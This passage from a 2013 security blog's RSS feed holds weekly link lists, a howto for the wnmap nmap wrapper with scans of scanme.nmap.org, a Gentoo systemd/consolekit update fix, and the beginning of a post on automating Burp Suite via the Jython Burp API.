<li><a href="http://getpocket.com/redirect?url=http%3A%2F%2Fwww.exploit-db.com%2Fexploits%2F29290%2F">Apache / PHP 5.x Remote Code Execution Exploit</a></li>
<li><a href="http://www.embedded.com/design/safety-and-security/4396040/An-Introduction-to-Elliptic-Curve-Cryptography">An introduction to elliptic curve cryptography</a></li>
<li><a href="http://blog.cloudflare.com/a-relatively-easy-to-understand-primer-on-elliptic-curve-cryptography">A (Relatively Easy To Understand) Primer on Elliptic Curve Cryptography</a></li>
<li><a href="http://qandwhat.apps.runkite.com/i-failed-a-twitter-interview/">I Failed a Twitter Interview</a></li>
<li><a href="http://www.theguardian.com/world/2013/oct/24/former-spy-chief-overheard-acela-twitter">Former spy chief overheard giving off-the-record interview from Acela train</a></li>
</ul>]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 14</title>
      <link>https://blog.dornea.nu/2013/10/25/links-of-the-week-14/</link>
      <pubDate>Fri, 25 Oct 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/10/25/links-of-the-week-14/</guid>
      <content:encoded><![CDATA[<ol>
<li><a href="http://oweng.myweb.port.ac.uk/fbi-tor-malware-analysis/">FBI Tor Malware Analysis</a></li>
<li><a href="http://opensecuritytraining.info/IntroductionToReverseEngineering_files/2013IntroRE.pdf">Intro into Reverse Engineering Course</a></li>
<li><a href="https://news.ycombinator.com/item?id=6577860">Dear undergraduated hacker</a></li>
<li><a href="http://www.amanhardikar.com/mindmaps/Practice.html">Penetration Testing Practice Lab / Vulnerable Apps/Systems</a></li>
<li><a href="https://communities.intel.com/community/itpeernetwork/blog/2013/10/08/how-offensive-cyber-security-is-changing-the-industry">How Offensive Cyber Security is Changing the Industry</a></li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 13</title>
      <link>https://blog.dornea.nu/2013/10/18/links-of-the-week-13/</link>
      <pubDate>Fri, 18 Oct 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/10/18/links-of-the-week-13/</guid>
      <content:encoded><![CDATA[<ol>
<li>
<p><a href="http://code.google.com/p/corkami/wiki/mix?show=content">CorkaMix</a>: This is indeed insane!</p>
</li>
<li>
<p><a href="http://insights.qunb.com/why-we-hate-infographics-and-why-you-should">Why We Hate Infographics (And Why You Should)</a></p>
</li>
<li>
<p itemprop="name">
  <a href="http://theinvisiblethings.blogspot.de/2009/06/more-thoughts-on-cpu-backdoors.html">More Thoughts on CPU backdoors</a>: Very briefly
</p>
</li>
<li>
<p><a href="http://www.pakalertpress.com/2013/09/21/what-happens-to-our-body-after-drinking-coca-cola/">What Happens To Our Body After Drinking Coca Cola?</a>: Coke anybody?</p>
</li>
<li>
<p><a href="http://blogs.cisco.com/security/introducing-kvasir/">Kvasir: Network Vulnerability Management System</a></p>
</li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 12</title>
      <link>https://blog.dornea.nu/2013/09/20/links-of-the-week-12/</link>
      <pubDate>Fri, 20 Sep 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/09/20/links-of-the-week-12/</guid>
      <content:encoded><![CDATA[<ul>
<li><a href="http://www.rollingstone.com/feature/the-geeks-on-the-frontlines">Hackers Courted by Government for Cyber Security Jobs - Rolling Stone</a></li>
<li><a href="http://blog.erratasec.com/2013/09/we-scanned-internet-for-port-22.html">We scanned the Internet for port 22</a></li>
<li><a href="https://blogs.oracle.com/ksplice/entry/hosting_backdoors_in_hardware">Hosting backdoors in hardware (Ksplice Blog)</a></li>
<li><a href="http://book.mixu.net/distsys/single-page.html">Distributed systems for fun and profit</a></li>
<li><a href="http://blogs.avg.com/mobile-2/analyzing-android-webview-exploit/">Analyzing an Android Webview Exploit</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Automate nmap scanning</title>
      <link>https://blog.dornea.nu/2013/09/13/howto-automate-nmap-scanning/</link>
      <pubDate>Fri, 13 Sep 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/09/13/howto-automate-nmap-scanning/</guid>
      <content:encoded><![CDATA[<p>Recently a <a href="http://nullsecurity.net/about.html">colleague</a> of mine at <a href="http://nullsecurity.net/">nullsecurity.net</a> released a new scanning tool called <a href="http://nullsecurity.net/tools/automation/wnmap-0.1.tar.gz">wnmap</a>. Basically it&rsquo;s a wrapper around nmap which helps automating the scanning process by using simple configuration files. Let&rsquo;s have a look at it..</p>
<h2 id="configuration">Configuration</h2>
<p>Make sure you you have downloaded the archive and open <strong>src/core/wnmap.conf</strong> in order to edit:</p>
<ul>
<li>the wnmap path</li>
<li>editor preferences</li>
<li>global parameters (to use in every scan)</li>
</ul>
<h2 id="running-the-tool">Running the tool</h2>
<p>Now the obligatory -help message:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">-==[ wnmap by nrz@nullsecurity.net ]==--
Usage: wnmap [options] &lt;target specification&gt; | &lt;misc&gt;
TARGET SPECIFICATION:
    Can pass hostname or IP address.
OPTIONS:
    SCANNING - USER MODE:
    -F: &#39;fast&#39; scan - nmap args: -F
    -K: &#39;ack&#39; scan - nmap args: -PA
    -V: &#39;version&#39; scan - nmap args: -sV -version-trace
    -O: &#39;os&#39; scan - nmap args: -O --osscan-guess
    -M: &#39;script_malware&#39; scan - nmap args: -script malware
    -H: &#39;http-methods&#39; scan - nmap args: -P0 --script=http-methods.nse -p 80,443
    SCANNING - STANDARD MODE:
    -C: chain all modes
    LOAD NEW SCAN:
    -a {wnmap_arg;mode_name;nmap_args;need_sudo?[true,false]}: add new scan to user mode
MISC:
    -r: rescan host by default
    -e: edit wmodes.conf
    -v: print version of wnmap and exit
    -h: print this help and exit
EXAMPLES:
    wnmap -F 8.8.8.8 -r # scan again
    wnmap -C scanme.nmap.org # give it all you got
    wnmap -a &#34;-I;iddle-scan;-P0 -p- -sI sweet.host.com;true&#34;
    wnmap -e # edit modes
</code></pre></div><p>As you can see the tool comes along with several **predefined **running modes. You can easily edit them at <strong>src/core/wmodes.conf:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% cat src/core/wmodes.conf
# SAMPLE FILE !!! DEFINE YOUR OWN MAGIC !!!
# wnmap_arg; mode_name; nmap_args; sudo?
-F;fast;-F;false
-K;ack;-PA;false
-V;version;-sV -version-trace;false
-O;os;-O --osscan-guess;true
-M;script_malware;-script malware;false
</code></pre></div><p>Quite handy, isn&rsquo;t it? You can <strong>chain</strong> the modes using **-C. **</p>
<h2 id="add-new-mode">Add new mode</h2>
<p>Let&rsquo;s say I want to add a new mode, which will scan all hosts at port 80 and 443 for web services. In particular I want to the the supported HTTP methods at those ports.<br>
You can easily use the command line to insert the new mode:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% ./wnmap -a &#34;-H;http-methods;-P0 --script=http-methods.nse -p 80,443;false&#34;
--==[ wnmap by nrz@nullsecurity.net ]==--
[+] New mode added!
</code></pre></div><p>or edit **src/core/wmodes.conf **directly.Now let&rsquo;s scan a host using the newly inserted mode:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% ./wnmap -H scanme.nmap.org
--==[ wnmap by nrz@nullsecurity.net ]==--
[+] Creating scanme.nmap.org/http-methods
[+] Scanning scanme.nmap.org
[*] cmd: /usr/bin/nmap -P0 --script=http-methods.nse -p 80,443 --reason -oX scanme.nmap.org/http-methods/scanme.nmap.org.xml -oN scanme.nmap.org/http-methods/scanme.nmap.org.nmap scanme.nmap.org
Starting Nmap 6.25 ( http://nmap.org ) at 2013-09-11 15:32 CEST
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up, received user-set (0.18s latency).
PORT    STATE  SERVICE REASON
80/tcp  open   http    syn-ack
|_http-methods: GET HEAD POST OPTIONS
443/tcp closed https   conn-refused
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
</code></pre></div><p>Now you should see a directory called <strong>scanme.nmap.org</strong> inside your working directory. The output of the scan was saved as a regular nmap file and as XML.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># tree scanme.nmap.org
scanme.nmap.org
`-- http-methods
    |-- scanme.nmap.org.nmap
    `-- scanme.nmap.org.xml
</code></pre></div><h2 id="combine-modes">Combine modes</h2>
<p>You could now combine the modes:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% ./wnmap -H -F scanme.nmap.org
</code></pre></div><p>And you&rsquo;ll get:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># tree scanme.nmap.org 
scanme.nmap.org
|-- fast
|   |-- scanme.nmap.org.nmap
|   `-- scanme.nmap.org.xml
`-- http-methods
    |-- scanme.nmap.org.nmap
    `-- scanme.nmap.org.xml
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 11</title>
      <link>https://blog.dornea.nu/2013/09/13/links-of-the-week-11/</link>
      <pubDate>Fri, 13 Sep 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/09/13/links-of-the-week-11/</guid>
      <content:encoded><![CDATA[<ol>
<li><a href="http://de.slideshare.net/mruef/nmap-nse-hacking-for-it-security-professionals">nmap NSE hacking for IT security professionals</a></li>
<li><a href="http://symbo1ics.com/blog/?p=2055">The Wretched Google Interview Experience</a></li>
<li><a href="https://medium.com/editors-picks/c02f1ff471c6">Why I left Google</a></li>
<li><a href="http://www.fastcompany.com/3016938/dialed/why-i-left-google">I Left Google And Lived To Happily Tell About It</a></li>
<li><a href="https://www.schneier.com/blog/archives/2013/09/the_nsas_crypto_1.html">The NSA&rsquo;s Cryptographic Capabilities</a></li>
<li><a href="https://blog.avast.com/2013/08/27/linux-trojan-hand-of-thief-ungloved/">Linux Trojan &ldquo;Hand of Thief&rdquo; ungloved</a></li>
<li><a href="http://blog.chrisdrane.com/?p=49">You&rsquo;re Smart. So What?</a></li>
<li><a href="http://www.brandonmwest.com/development/2013/08/22/github-is-not-your-new-resume.html">GitHub is Not Your New Resume</a></li>
</ol>
]]></content:encoded>
    </item>
    
    <item>
      <title>Dissecting BlackTiny</title>
      <link>https://blog.dornea.nu/2013/08/25/dissecting-blacktiny/</link>
      <pubDate>Sun, 25 Aug 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/08/25/dissecting-blacktiny/</guid>
      <content:encoded><![CDATA[<p>To whom it may concernâ€¦<br>
<img src="/posts/img/2013/7b418d46a87358e107b82be9e7140ba4.jpg" alt="">
<img src="/posts/img/2013/333bc0483fe3272aec286723926277a5.jpg" alt=""></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 10</title>
      <link>https://blog.dornea.nu/2013/08/23/links-of-the-week-10/</link>
      <pubDate>Fri, 23 Aug 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/08/23/links-of-the-week-10/</guid>
      <content:encoded><![CDATA[<ul>
<li><a href="http://www.defmacro.org/2013/07/23/startup-lessons.html">57 startup lessons</a></li>
<li><a href="http://haxit.blogspot.de/2013/08/hacking-transcend-wifi-sd-cards.html">Hacking Transcend WiFi SD Cards</a></li>
<li><a href="http://research.swtch.com/macpprof">Hacking the OS X Kernel for Fun and Profiles</a></li>
<li><a href="http://www.washingtonpost.com/blogs/the-switch/wp/2013/08/18/heres-what-you-find-when-you-scan-the-entire-internet-in-an-hour/">Here&rsquo;s what you find when you scan the entire Internet in an hour</a></li>
<li><a href="http://notezilla.io/">noteZilla:Â Interactive,clickable, sheet music</a></li>
<li><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up (How the heck do we get to main()?)</a></li>
<li><a href="http://bpodgursky.wordpress.com/2013/08/21/average-income-per-programming-language/%25">Average Income per Programming Language</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Gentoo, systemd, consolekit, udev and some failed system update</title>
      <link>https://blog.dornea.nu/2013/08/10/gentoo-systemd-consolekit-udev-and-some-failed-system-update/</link>
      <pubDate>Sat, 10 Aug 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/08/10/gentoo-systemd-consolekit-udev-and-some-failed-system-update/</guid>
      <content:encoded><![CDATA[<p>OK, first some explanations:</p>
<ul>
<li><strong>systemd</strong> is a modern sysvinit &amp; RC replacement for Linux systems. It is supported in Gentoo as an alternate init system. (Source: <a href="http://wiki.gentoo.org/wiki/Systemd">http://wiki.gentoo.org/wiki/Systemd)</a></li>
<li><strong>ConsoleKit</strong> is a framework for defining and tracking users, login sessions, and seats. (Source:<a href="http://wiki.gentoo.org/wiki/ConsoleKit"> http://wiki.gentoo.org/wiki/ConsoleKit)</a></li>
<li><strong>udev</strong> is the device manager for the Linux kernel. Primarily, it manages device nodes in <tt>/dev</tt> and handles all user space actions when adding/removing devices. Also have a look at <a href="http://www.gentoo.org/proj/en/eudev" rel="nofollow">eudev</a> a gentoo fork of udev. (Source: <a href="http://wiki.gentoo.org/wiki/Udev">http://wiki.gentoo.org/wiki/Udev)</a></li>
</ul>
<p>At first look they don&rsquo;t seem to have sth in common. These are some other facts:</p>
<ul>
<li><em>systemd</em> and <em>udev</em> don&rsquo;t like each other</li>
<li><em>systemd</em> conflicts with <em>consolekit</em></li>
<li><em>consolekit</em> is not longer maintained</li>
<li><em>systemd</em> *is* <em>udev</em> (as systemd somehow includes udev)</li>
<li><em>polkit</em> depends on <em>consolekit</em> and they will both pull eath other</li>
<li><em>consolekit</em> has been replaced by logind which is being provided by <em>systemd</em></li>
<li>&hellip;and top of that <em>OpenRC</em> is somehow also involved in this whole thing.</li>
</ul>
<p>As you may have noticed: THIS IS A WHOLE BUNCH OF BULLSHIT GOING ON! I just wanted to update my Gentoo system and got stucked in some stupid conflicts between the mentioned packets. It took about one day to solve it (after reading lots of forum threads of people complaining about the same thing). Check:</p>
<ul>
<li><a href="http://forums.gentoo.org/viewtopic-t-920340-start-0.html" title="Force Disable ConsoleKit?">Force Disable Consolekit</a></li>
<li><a href="http://forums.gentoo.org/viewtopic-t-917584.html">Want to get rid of *kits. What should I be careful about?</a></li>
<li><a href="http://forums.gentoo.org/viewtopic-p-7367906.html">SOLVED gnome3 systemd udev and many other things</a></li>
</ul>
<p>Be sure you read them. They&rsquo;ve helped me a lot to understand this whole topic. So after all this is how I was able to solve it:</p>
<ul>
<li>Remove all USE flags related to consolekit:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># euse -D consolekit policykit upower udisks
</code></pre></div><ul>
<li>Make sure you have a <code>clean</code> /etc/make.conf. Here is mine:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># These settings were set by the catalyst build script that automatically
# built this stage.
# Please consult /usr/share/portage/config/make.conf.example for a more
# detailed example.
CFLAGS=&#34;-O2 -pipe&#34;
CXXFLAGS=&#34;${CFLAGS}&#34;
# WARNING: Changing your CHOST is not something that should be done lightly.
# Please consult http://www.gentoo.org/doc/en/change-chost.xml before changing.
CHOST=&#34;x86_64-pc-linux-gnu&#34;
# These are the USE flags that were used in addition to what is provided by the
# profile used for building.
ACCEPT_LICENSE=&#34;*&#34;
ACCEPT_KEYWORDS=&#34;~amd64&#34;
AUTOCLEAN=&#34;yes&#34;
VIDEO_CARDS=&#34;intel&#34;
USE=&#34;acpi smapi mmx sse sse2 cairo svg -kde qt4 qt3support dbus \
     declarative jpeg png vorbis ogg pulse alsa usb sdl spice gtk gtk3 \
     -gnome-shell -consolekit -policykit -upower -udisks&#34;
MAKEOPTS=&#34;-j2&#34;
FEATURES=&#34;-userfetch&#34;
#CCACHE_DIR=&#34;/var/tmp/ccache&#34;
#CCACHE_SIZE=&#34;2G&#34;
#source /var/lib/layman/make.conf

# Set PORTDIR for backward compatibility with various tools:
#   gentoo-bashcomp - bug #478444
#   euse - bug #474574
#   euses and ufed - bug #478318
PORTDIR=&#34;/usr/portage&#34;
</code></pre></div><ul>
<li>Make sure you have selected the right profile</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># eselect profile list
Available profile symlink targets:
  [1]   default/linux/amd64/13.0
  [2]   default/linux/amd64/13.0/selinux
  [3]   default/linux/amd64/13.0/desktop *
  [4]   default/linux/amd64/13.0/desktop/gnome
  [5]   default/linux/amd64/13.0/desktop/kde
  [6]   default/linux/amd64/13.0/developer
  [7]   default/linux/amd64/13.0/no-multilib
  [8]   default/linux/amd64/13.0/x32
  [9]   hardened/linux/amd64
  [10]  hardened/linux/amd64/selinux
  [11]  hardened/linux/amd64/no-multilib
  [12]  hardened/linux/amd64/no-multilib/selinux
  [13]  hardened/linux/amd64/x32
  [14]  hardened/linux/uclibc/amd64
</code></pre></div><ul>
<li>Adjust profile settings</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># cd /etc/portage/profile
# cat use.force
-consolekit
# cat use.mask
consolekit
-systemd
</code></pre></div><ul>
<li>Remove udev, consolekit and polkit</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># emerge -aC udev consolekit polkit
</code></pre></div><ul>
<li>Now you should be able to install systemd</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># emerge -pv systemd
</code></pre></div><ul>
<li>Now update your system</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># emerge --keep-going --jobs 4 --update --newuse --ask --deep --with-bdeps=y @world
</code></pre></div><p>Additional steps to clean up your system:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># emerge -a --depclean
# revdep-rebuild -- -q --keep-going
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 8</title>
      <link>https://blog.dornea.nu/2013/08/09/links-of-the-week-8/</link>
      <pubDate>Fri, 09 Aug 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/08/09/links-of-the-week-8/</guid>
      <content:encoded><![CDATA[<ul>
<li><a href="http://justanapplication.wordpress.com/category/android/android-bugs/android-bug-8219321/">Android Bug 82119321</a>: A comprehensive description of the recent Android bug also known as the signature bug</li>
<li><a href="http://foaas.com/">FOOAS</a>: Fuck Of As A Service</li>
<li><a href="http://progrium.com/localtunnel/?news=hnnaw#readme">localtunnel</a>: Access your local web server through the internet</li>
<li>[A Tour Inside CloudFlareâ€™s Latest Generation Servers}(http://blog.cloudflare.com/a-tour-inside-cloudflares-latest-generation-servers): Really impressive!</li>
<li><a href="http://motherboard.vice.com/blog/this-is-what-wi-fi-would-look-like-if-we-could-see-it">Hereâ€™s What Wi-Fi Would Look Like If We Could See It</a></li>
<li><a href="http://www.trollaxor.com/2010/06/why-i-left-openbsd.html">Why I left OpenBSD</a>: Remember <a href="http://julipedia.meroh.net/2013/06/self-interview-after-leaving-netbsd.html">self interview after leaving NetBSD</a>?</li>
<li><a href="https://www.netspi.com/blog/entryid/191/function-hooking-part-i-hooking-shared-library-function-calls-in-linux">Function Hooking Part 1 â€“ Hooking shared library function calls in Linux</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Links of the Week 9</title>
      <link>https://blog.dornea.nu/2013/08/09/links-of-the-week-9/</link>
      <pubDate>Fri, 09 Aug 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/08/09/links-of-the-week-9/</guid>
      <content:encoded><![CDATA[<p>This weeks links&hellip;</p>
<ul>
<li><a href="http://spritesmods.com/?art=hddhack&amp;page=1">Hard disk hacking:</a> Learn interesting stuff about hard disks</li>
<li><a href="http://securitywatch.pcmag.com/mobile-security/314386-russia-s-massive-android-malware-industry-revealed">Russiaâ€™s Massive Malware Industry Revealed</a></li>
<li><a href="http://www.zdnet.com/bgp-spoofing-routing-router-phishing-why-nothing-on-the-internet-is-actually-secure-7000019015/">BGP spoofing â€“ why nothing on the internet is actually secure</a></li>
<li><a href="http://jaclynkonzelmann.tumblr.com/post/29070457063/why-i-quit-microsoft-to-join-a-5-person-start-up-in">JACLYN KONZELMANN, Why I Quit Microsoft To Join A 5 Person Start Up In Toronto</a></li>
<li><a href="http://www.oddly-even.com/2013/07/31/the-largest-photo-ever-taken-of-tokyo-is-zoomable-and-it-is-glorious/">The largest photo ever taken of Tokyo is zoomable, and it is glorious</a></li>
<li><a href="http://blog.ivanristic.com/2013/08/configuring-apache-nginx-and-openssl-for-forward-secrecy.html">Configuring Apache, Nginx, and OpenSSL for Forward Secrecy</a></li>
<li><a href="http://www.reddit.com/r/netsec/comments/1ju6zh/php_exif_backdoors_generator_using_custom/">HP EXIF Backdoors generator using custom shellcode</a></li>
</ul>]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Automate Burp using Burp Extender API</title>
      <link>https://blog.dornea.nu/2013/08/02/howto-automate-burp-using-burp-extender-api/</link>
      <pubDate>Fri, 02 Aug 2013 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2013/08/02/howto-automate-burp-using-burp-extender-api/</guid>
      <content:encoded><![CDATA[<p>I really love <a href="http://portswigger.net/burp/">Burp</a>. Since I use it on a daily basis I thought there might be some way to automate it. Usually I mainly do these steps to scan some URL:</p>
<ol>
<li>Define scope</li>
<li>Start manual exploring OR spider the URL in order to get some target map</li>
<li>Activate passive scanning</li>
<li>Activate live scanning</li>
<li>Wait to the scan to finish</li>
<li>Have a look at the results</li>
<li>Save/export the results</li>
</ol>
<p>Well these are a lot of steps which have to be done manually. We all know that necessity is the mother of invention so I&rsquo;ve started looking for some concepts how to automate those steps. This is what I&rsquo;ve found&hellip;</p>
<h2 id="requirements">Requirements</h2>
<p>Before I&rsquo;ve started googling for some code I&rsquo;ve collected some requirements which <em>should</em> be fulfilled:</p>
<ul>
<li>Functional
<ul>
<li>Ability to communicate with Burp using some API</li>
<li>Control Burp by command line</li>
<li>Interact with Burp through some console</li>
<li>Tamper requests before being sent in the wild</li>
<li>Create events in order to trigger specific actions</li>
</ul>
</li>
<li>Technical
<ul>
<li>OS independent (should at least work on Linux and Windows)</li>
<li>Extendibility: Use your favourite programming language (Python, Java whatever) to interact with the API</li>
</ul>
</li>
<li>Reportings
<ul>
<li>Ability to create/generate/export results as XML, CSV, whatever.</li>
</ul>
</li>
</ul>
<p>Having this written I&rsquo;ve started googling.</p>
<h1 id="google-found">Google found&hellip;</h1>
<ul>
<li><a href="http://portswigger.net/burp/help/extender.html">Burp Extender API</a></li>
</ul>
<blockquote>
<p style="padding-left: 60px;">
  Burp Extender lets you load Burp extensions, to extend Burp's functionality using your own or third-party code.
</p>
<p style="padding-left: 60px;">
  Burp extensions can customize Burp's behavior in numerous ways, such as modifying HTTP requests and responses, customizing the UI, adding custom Scanner checks, and accessing key runtime information, including the <a href="http://portswigger.net/burp/help/proxy_history.html">Proxy history</a>, <a href="http://portswigger.net/burp/help/target_sitemap.html">Target site map</a> and <a href="http://portswigger.net/burp/help/scanner_results.html">Scanner results</a>. (Source: <a href="http://portswigger.net/burp/help/extender.html">http://portswigger.net/burp/help/extender.html</a>)
</p>
</blockquote>
<ul>
<li><a href="https://github.com/GDSSecurity/burpee">GDS Burp API</a></li>
</ul>
<blockquote>
<p class="crayon-selected" style="padding-left: 60px;">
  The GDS Burp API exposes a Python object interface to requests/responses recorded by Burp (whether Proxy/Spider/Repeater, etc). The API is used to parse Burp logs, creating a list of Burp objects that contain the request and response data and related meta-data. (Source: <a href="https://github.com/GDSSecurity/burpee">https://github.com/GDSSecurity/burpee</a>)
</p>
</blockquote>
<ul>
<li><a href="https://github.com/mwielgoszewski/jython-burp-api">Jython Burp API</a></li>
</ul>
<blockquote>
<p style="padding-left: 60px;">
  Jython-Burp-API exposes a Jython interface to the popular Burp Suite web security testing tool, as an alternative to <a href="http://tduehr.github.com/buby/">Buby</a> for those testers who prefer Python over Ruby. (Souce:Â <a href="https://github.com/mwielgoszewski/jython-burp-api">https://github.com/mwielgoszewski/jython-burp-api)</a>
</p>
</blockquote>
<p>The Burp Extender API is the main component and plays a crucial role in automating burp. There are a lot of extension (Java, Python, Ruby) and you could easily write your <a href="http://blog.portswigger.net/2012/12/writing-your-first-burp-extension.html">own</a> one. As you might have noticed there are 3 main supported languages: Java, Ruby and Python. And because I love the pythonic way of life I had closer look at the Jython Burp API. As stated on the github page you can get a jython console to interact with Burp. That&rsquo;s crazy! And this was one of my main requirements.</p>
<h1 id="jython-burp-api">Jython Burp API</h1>
<p>First I&rsquo;ve cloned the github repo and copied Burp into the* jython-burp-api *folder as described in the README.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ls -l
total 13173
drwxr-xr-x 3 vd vd     1024 2013-07-31 14:50 custom-modules
drwxr-xr-x 4 vd vd     1024 2013-08-02 11:27 jython-burp-api-master
lrwxrwxrwx 1 vd vd       28 2013-07-31 14:19 jython.jar -&gt; jython-standalone-2.7-b1.jar
-rw-r--r-- 1 vd vd 13432713 2013-07-31 13:49 jython-standalone-2.7-b1.jar
</code></pre></div><p>I *cd <em>into</em> jython-burp-api-master, *copied Burp into it and compiled the Burp Extender files:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ls -l
total 9068
-rw-r--r-- 1 vd vd    2087 2013-05-13 20:27 burp.ini
-rwxr-x--- 1 vd vd 9225061 2013-07-31 14:07 burpsuite_pro_v1.5.11.jar
drwxr-xr-x 3 vd vd    1024 2013-05-13 20:27 java
drwxr-xr-x 3 vd vd    1024 2013-07-31 15:39 Lib
-rw-r--r-- 1 vd vd     739 2013-05-13 20:27 LICENSE
-rw-r--r-- 1 vd vd    6662 2013-05-13 20:27 README.md
-rw-r--r-- 1 vd vd    3592 2013-07-31 15:30 run.py

$ javac -cp ../jython.jar java/src/*.java java/src/burp/*.java
</code></pre></div><p>Afterwards I tried to start Burp (as described in the README) using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ java -Xmx1g -jar ../jython.jar run.py -i -d -B burpsuite_pro_v1.5.11.jar
Traceback (most recent call last):
  File &#34;run.py&#34;, line 117, in &lt;module&gt;
    start_burp(opt, *args)
  File &#34;run.py&#34;, line 15, in start_burp
    from burp_extender import BurpExtender as MyBurpExtender, ConsoleThread
ImportError: No module named burp_extender
</code></pre></div><p>Hmmm.. Strange. I&rsquo;ve created this <a href="https://github.com/mwielgoszewski/jython-burp-api/issues/7">issue</a> and informed the developer about the bug. Finally I was able to solve it by myself. The problem was that jython didn&rsquo;t know where to find the module *burp_extender. *So the class path had to be changed:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ java -jar ../jython.jar -Dpython.path=Lib/ run.py -B burpsuite_pro_v1.5.11.jar -i -d -v

Jython 2.7b1 (default:ac42d59644e9, Feb 9 2013, 15:24:52) 
[OpenJDK 64-Bit Server VM (Sun Microsystems Inc.)] on java1.6.0_20
&gt;&gt;&gt; 
2013-08-02 11:39:08,582 - BurpExtender - DEBUG - Monitoring jython-burp-api-master/Lib/gds/burp/menu/console.py for changes
2013-08-02 11:39:08,594 - BurpExtender - DEBUG - Monitoring jython-burp-api-master/burp.ini for changes
help
&gt;&gt;&gt; Burp
&gt;&gt;&gt;
</code></pre></div><p>Ahh there we go! Now you should have Burp fired up and a jython console to interact with. Check out <a href="https://github.com/mwielgoszewski/jython-burp-api#examples">examples</a> for some commands.</p>
<h1 id="automation">Automation</h1>
<p>Having this done the next step was to automate the scanning process. The jython console is very helpful but I somehow have to automate Burp with one command. Sth like:</p>
